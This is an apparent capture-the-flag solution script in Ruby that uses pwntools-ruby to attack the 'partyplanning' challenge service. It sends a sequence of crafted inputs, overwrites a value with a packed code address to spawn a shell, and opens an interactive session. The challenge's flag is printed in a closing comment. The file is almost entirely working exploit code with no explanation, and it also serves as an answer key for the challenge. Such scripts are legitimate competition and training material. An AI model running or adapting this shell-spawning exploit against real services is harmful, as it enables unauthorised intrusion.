#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby


host, port = 'partyplanning.chal.pwning.xxx', 3291
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

z.puts '401457'
z.puts '401335'
z.puts 'Alice'
z.puts 'david942j'
z.puts 'lNHRHu' # hash 0x604218
z.puts 'QQpie'
z.puts 'WWWW'
z.puts 'pop'
z.puts 'foooood~'
z.puts '' # important
z.recvuntil('[y/N]')
sleep(2)
# z.write 'AAAA'
z.puts p32(0x402642)[0,3]
p 'shell!'
z.interact

# PCTF{4nd_th4ts_why_w3_d0nt_p14n_p4rt13s_1n_p4r4113l}
